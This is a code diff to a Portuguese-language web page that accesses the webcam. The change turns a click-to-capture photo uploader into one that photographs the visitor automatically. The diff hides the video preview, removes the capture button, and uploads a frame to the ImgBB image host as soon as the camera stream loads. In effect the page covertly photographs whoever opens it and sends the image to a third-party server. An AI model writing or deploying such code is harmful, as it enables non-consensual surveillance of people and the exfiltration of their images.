@@ -3,12 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Captura e Envio de Imagem</title>
+    <title>Captura Automática e Envio</title>
 </head>
 <body>
-    <h1>Captura e Envio de Imagem</h1>
-    <video id="video" autoplay></video>
-    <button id="capture">Capturar Foto</button>
+    <h1>Captura Automática e Envio</h1>
+    <video id="video" autoplay style="display: none;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
     <p id="link"></p>
     <script>
@@ -20,11 +19,20 @@
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
-            })
-            .catch(err => console.error('Erro ao acessar câmera:', err));
 
-        // Capturar imagem e enviar ao ImgBB
-        document.getElementById('capture').addEventListener('click', () => {
+                // Esperar a câmera estar pronta
+                video.addEventListener('loadeddata', () => {
+                    // Capturar imagem automaticamente
+                    captureAndUpload();
+                });
+            })
+            .catch(err => {
+                console.error('Erro ao acessar câmera:', err);
+                alert('Erro ao acessar câmera. Verifique as permissões do navegador.');
+            });
+
+        // Função para capturar imagem e enviar ao ImgBB
+        function captureAndUpload() {
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
@@ -33,6 +41,7 @@
 
             // Converter imagem em Base64
             const imageData = canvas.toDataURL('image/png');
+            console.log('Imagem capturada automaticamente.');
 
             // Enviar imagem ao ImgBB
             const formData = new FormData();
@@ -48,10 +57,13 @@
                 console.log('Imagem enviada:', result.data.url);
                 const link = document.getElementById('link');
                 link.innerHTML = `<a href="${result.data.url}" target="_blank">Ver Imagem</a>`;
-                alert('Imagem enviada com sucesso!');
+                alert('Imagem capturada e enviada com sucesso!');
             })
-            .catch(error => console.error('Erro ao enviar imagem:', error));
-        });
+            .catch(error => {
+                console.error('Erro ao enviar imagem:', error);
+                alert('Erro ao enviar imagem. Verifique a API Key ou conexão.');
+            });
+        }
     </script>
 </body>
 </html>
